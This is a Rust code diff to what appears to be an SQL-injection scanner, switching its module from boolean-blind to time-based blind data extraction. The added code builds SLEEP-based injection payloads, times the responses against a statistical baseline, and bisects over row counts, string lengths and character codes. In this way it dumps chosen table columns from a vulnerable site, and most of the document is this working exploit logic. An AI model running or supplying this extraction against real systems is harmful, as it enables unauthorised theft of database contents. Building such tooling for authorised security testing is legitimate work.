@@ -1,7 +1,8 @@
-//! Boolean-blind data extraction: bisection algorithm for extracting
-//! strings and numbers using TRUE/FALSE page-difference oracle.
+//! Time-based blind data extraction: bisection algorithm using SLEEP/WAITFOR
+//! delays as the oracle instead of page-content differences.
 
 use std::time::{Duration, Instant};
+use tokio::time::timeout;
 use anyhow::Result;
 use tracing::info;
 
@@ -9,22 +10,18 @@ use crate::sqx::{
     detector::SqliDetector,
     models::{
         BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult,
-        CancellationToken, ExtractionStatus, HttpResponse,
+        CancellationToken, ExtractionStatus,
     },
-    similarity::calculate_similarity,
 };
 
 impl SqliDetector {
-    /// Extract data using blind SQL injection (bisection algorithm).
-    ///
-    /// Extracts data character-by-character using O(log n) requests per char.
-    pub async fn extract_data_blind(
+    /// Extract data using time-based blind SQL injection.
+    pub async fn extract_data_time_based(
         &self,
         url: &str,
         param: &str,
         original_value: &str,
         extraction_config: &BlindExtractionConfig,
-        baseline: &HttpResponse,
         progress_callback: Option<Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
         cancel_token: Option<CancellationToken>,
     ) -> Result<BlindExtractionResult> {
@@ -33,10 +30,8 @@ impl SqliDetector {
         let mut extracted_values = Vec::new();
 
         info!(
-            "Starting blind data extraction from {}.{} using {:?}",
-            extraction_config.target_table,
-            extraction_config.target_column,
-            extraction_config.technique
+            "Starting time-based blind extraction from {}.{}",
+            extraction_config.target_table, extraction_config.target_column
         );
 
         if let Some(ref token) = cancel_token
@@ -49,40 +44,35 @@ impl SqliDetector {
                 });
             }
 
-        if let Some(ref callback) = progress_callback {
-            callback(BlindExtractionProgress {
-                current_value_index: 0,
-                current_char_index: 0,
-                extracted_so_far: String::new(),
-                total_requests: 0,
-                status: ExtractionStatus::Running,
-            });
-        }
-
-        let technique = extraction_config.technique;
+        // Statistical baseline: 3 samples → mean + 2σ threshold
+        let (baseline_mean, baseline_stddev) = self.measure_baseline_timing(url, 3).await?;
+        let threshold = baseline_mean + baseline_stddev * 2;
+        total_requests += 3;
+        info!(
+            "Baseline timing: mean={:?}, stddev={:?}, threshold={:?}",
+            baseline_mean, baseline_stddev, threshold
+        );
 
         let row_count = self
-            .get_row_count_blind(
-                url, param, original_value, extraction_config, baseline,
-                &mut total_requests, cancel_token.as_ref(),
+            .get_row_count_time_based(
+                url, param, original_value, extraction_config,
+                &mut total_requests, cancel_token.as_ref(), threshold,
             )
             .await?;
 
         let rows_to_extract = row_count.min(extraction_config.max_rows);
-        info!("Found {} rows, extracting {}", row_count, rows_to_extract);
 
         for row_index in 0..rows_to_extract {
             if let Some(ref token) = cancel_token
                 && token.is_cancelled() {
-                    info!("Extraction cancelled after {} rows", row_index);
                     break;
                 }
 
             let value = self
-                .extract_string_blind(
-                    url, param, original_value, extraction_config, baseline,
+                .extract_string_time_based(
+                    url, param, original_value, extraction_config,
                     row_index, &mut total_requests,
-                    progress_callback.as_ref(), cancel_token.as_ref(),
+                    progress_callback.as_ref(), cancel_token.as_ref(), threshold,
                 )
                 .await?;
 
@@ -103,32 +93,28 @@ impl SqliDetector {
         let elapsed = start_time.elapsed();
         let is_cancelled = cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false);
 
-        info!(
-            "Blind extraction {}: {} values in {} requests ({:?})",
-            if is_cancelled { "stopped" } else { "complete" },
-            extracted_values.len(),
-            total_requests,
-            elapsed
-        );
-
         Ok(BlindExtractionResult {
             extracted_values,
             total_requests,
             extraction_time_secs: elapsed.as_secs(),
-            technique_used: format!("{:?}", technique),
+            technique_used: if is_cancelled {
+                "TimeBased(Stopped)".to_string()
+            } else {
+                "TimeBased".to_string()
+            },
         })
     }
 
-    /// Get row count using boolean blind injection.
-    pub(crate) async fn get_row_count_blind(
+    /// Get row count using time-based technique.
+    pub(crate) async fn get_row_count_time_based(
         &self,
         url: &str,
         param: &str,
         original_value: &str,
         config: &BlindExtractionConfig,
-        baseline: &HttpResponse,
         request_count: &mut usize,
         cancel_token: Option<&CancellationToken>,
+        threshold: Duration,
     ) -> Result<usize> {
         if let Some(token) = cancel_token
             && token.is_cancelled() {
@@ -136,30 +122,28 @@ impl SqliDetector {
             }
 
         let query = format!("(SELECT COUNT(*) FROM {})", config.target_table);
-        // Cap at 1000 rows — 9999 caused binary search to return max when the
-        // injection oracle couldn't distinguish TRUE/FALSE (e.g. login forms).
         let count = self
-            .extract_number_blind(
-                url, param, original_value, &query, baseline,
-                0, 1000, request_count, cancel_token,
+            .extract_number_time_based(
+                url, param, original_value, &query,
+                0, 9999, request_count, cancel_token, threshold,
             )
             .await?;
 
         Ok(count as usize)
     }
 
-    /// Extract a string value character by character using bisection.
-    pub(crate) async fn extract_string_blind(
+    /// Extract string using time-based technique.
+    pub(crate) async fn extract_string_time_based(
         &self,
         url: &str,
         param: &str,
         original_value: &str,
         config: &BlindExtractionConfig,
-        baseline: &HttpResponse,
         row_index: usize,
         request_count: &mut usize,
         progress_callback: Option<&Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
         cancel_token: Option<&CancellationToken>,
+        threshold: Duration,
     ) -> Result<String> {
         let mut result = String::new();
 
@@ -186,13 +170,12 @@ impl SqliDetector {
 
         let length_query = format!("LENGTH({})", subquery);
         let length = self
-            .extract_number_blind(
-                url, param, original_value, &length_query, baseline,
-                0, config.max_length_per_value as i32, request_count, cancel_token,
+            .extract_number_time_based(
+                url, param, original_value, &length_query,
+                0, config.max_length_per_value as i32, request_count,
+                cancel_token, threshold,
             )
             .await?;
-
-        info!("Row {} has length {}", row_index, length);
 
         for pos in 1..=length {
             if let Some(token) = cancel_token
@@ -202,9 +185,9 @@ impl SqliDetector {
 
             let char_query = format!("ASCII(SUBSTRING({}, {}, 1))", subquery, pos);
             let ascii_val = self
-                .extract_number_blind(
-                    url, param, original_value, &char_query, baseline,
-                    0, 127, request_count, cancel_token,
+                .extract_number_time_based(
+                    url, param, original_value, &char_query,
+                    0, 127, request_count, cancel_token, threshold,
                 )
                 .await?;
 
@@ -225,22 +208,22 @@ impl SqliDetector {
         Ok(result)
     }
 
-    /// Extract a number using bisection (binary search).
+    /// Extract a number using time-based bisection.
     ///
     /// Standard single-request-per-level bisection: while low < high,
     /// test `query > mid`. If true → low = mid + 1, else → high = mid.
     /// When low == high the answer is found. O(log n) requests, no equality check.
-    pub(crate) async fn extract_number_blind(
+    pub(crate) async fn extract_number_time_based(
         &self,
         url: &str,
         param: &str,
         original_value: &str,
         query: &str,
-        baseline: &HttpResponse,
         min_val: i32,
         max_val: i32,
         request_count: &mut usize,
         cancel_token: Option<&CancellationToken>,
+        threshold: Duration,
     ) -> Result<i32> {
         let mut low = min_val;
         let mut high = max_val;
@@ -255,7 +238,9 @@ impl SqliDetector {
 
             let condition = format!("{} > {}", query, mid);
             let is_greater = self
-                .test_condition_blind(url, param, original_value, &condition, baseline)
+                .test_condition_time_based(
+                    url, param, original_value, &condition, threshold,
+                )
                 .await?;
             *request_count += 1;
 
@@ -271,88 +256,41 @@ impl SqliDetector {
         Ok(low) // low == high == answer
     }
 
-    /// Test a boolean condition using blind SQL injection.
+    /// Test a condition using time-based technique.
     ///
-    /// Returns `true` if the condition is TRUE (page matches baseline).
-    ///
-    /// Uses a three-tier oracle:
-    ///   1. Status code change → FALSE (login form redirect/no-redirect signal).
-    ///   2. Body similarity clearly low (< 0.5) → FALSE.
-    ///   3. Differential oracle: if baseline and known-FALSE look nearly identical
-    ///      (gap < 0.05), fetch both a known-TRUE and known-FALSE probe and classify
-    ///      the condition response by proximity. This handles targets where TRUE/FALSE
-    ///      pages differ by only a few percent (e.g. different image on success/fail).
-    pub(crate) async fn test_condition_blind(
+    /// Returns `true` if a time delay occurred (condition is TRUE).
+    /// `threshold` is the pre-computed upper bound of normal response time
+    /// (`mean + 2 * stddev`). A response is considered delayed if it exceeds
+    /// `threshold + sleep_duration/2` (headroom below the injected SLEEP).
+    pub(crate) async fn test_condition_time_based(
         &self,
         url: &str,
         param: &str,
         original_value: &str,
         condition: &str,
-        baseline: &HttpResponse,
+        threshold: Duration,
     ) -> Result<bool> {
+        let sleep_secs = self.config.sleep_duration_secs;
         let is_numeric = original_value.parse::<i64>().is_ok();
 
-        let true_payload = if is_numeric {
-            format!("{} AND {}", original_value, condition)
+        let payload = if is_numeric {
+            format!("{} AND IF({}, SLEEP({}), 0)", original_value, condition, sleep_secs)
         } else {
-            format!("{}' AND ({})", original_value, condition)
+            format!("{}' AND IF({}, SLEEP({}), 0)-- ", original_value, condition, sleep_secs)
         };
 
-        let test_url = self.build_test_url(url, param, original_value, &true_payload);
-        let response = self.send_request(&test_url).await?;
+        let test_url = self.build_test_url(url, param, original_value, &payload);
 
-        // Signal 1: status code change is a strong FALSE signal.
-        if response.status != baseline.status {
-            return Ok(false);
-        }
-
-        let similarity = calculate_similarity(&baseline.body, &response.body);
-
-        // Signal 2: clearly different body → FALSE.
-        if similarity < 0.5 {
-            return Ok(false);
-        }
-
-        // Signal 3: if similarity is high but we can't be sure, use differential oracle.
-        // Fetch known-TRUE and known-FALSE probes to calibrate.
-        // This costs 2 extra requests but is only triggered when similarity > 0.85,
-        // which is when the simple threshold would be unreliable.
-        if similarity > 0.85 {
-            let (known_true_pl, known_false_pl) = if is_numeric {
-                (
-                    format!("{} AND 1=1", original_value),
-                    format!("{} AND 1=2", original_value),
-                )
-            } else {
-                (
-                    format!("{}' AND '1'='1", original_value),
-                    format!("{}' AND '1'='2", original_value),
-                )
-            };
-
-            let true_url  = self.build_test_url(url, param, original_value, &known_true_pl);
-            let false_url = self.build_test_url(url, param, original_value, &known_false_pl);
-
-            let (true_ref, false_ref) = tokio::join!(
-                self.send_request(&true_url),
-                self.send_request(&false_url),
-            );
-
-            if let (Ok(tr), Ok(fr)) = (true_ref, false_ref) {
-                let gap = calculate_similarity(&baseline.body, &tr.body)
-                    - calculate_similarity(&baseline.body, &fr.body);
-
-                if gap > 0.02 {
-                    // The target has a detectable TRUE/FALSE difference.
-                    // Classify by proximity: which reference is the probe closer to?
-                    let sim_to_true  = calculate_similarity(&tr.body, &response.body);
-                    let sim_to_false = calculate_similarity(&fr.body, &response.body);
-                    return Ok(sim_to_true >= sim_to_false);
-                }
-                // gap <= 0.02: target is indistinguishable — fall through to simple threshold.
+        let start = Instant::now();
+        match timeout(Duration::from_secs(10 + sleep_secs), self.send_request(&test_url)).await {
+            Ok(Ok(_)) => {
+                let duration = start.elapsed();
+                // Use half the sleep duration as headroom to account for network variance
+                let detection_threshold = threshold + Duration::from_secs(sleep_secs / 2);
+                Ok(duration > detection_threshold)
             }
+            Ok(Err(_)) => Ok(false),
+            Err(_) => Ok(true), // Timeout → SLEEP executed → condition TRUE
         }
-
-        Ok(similarity > 0.9)
     }
 }
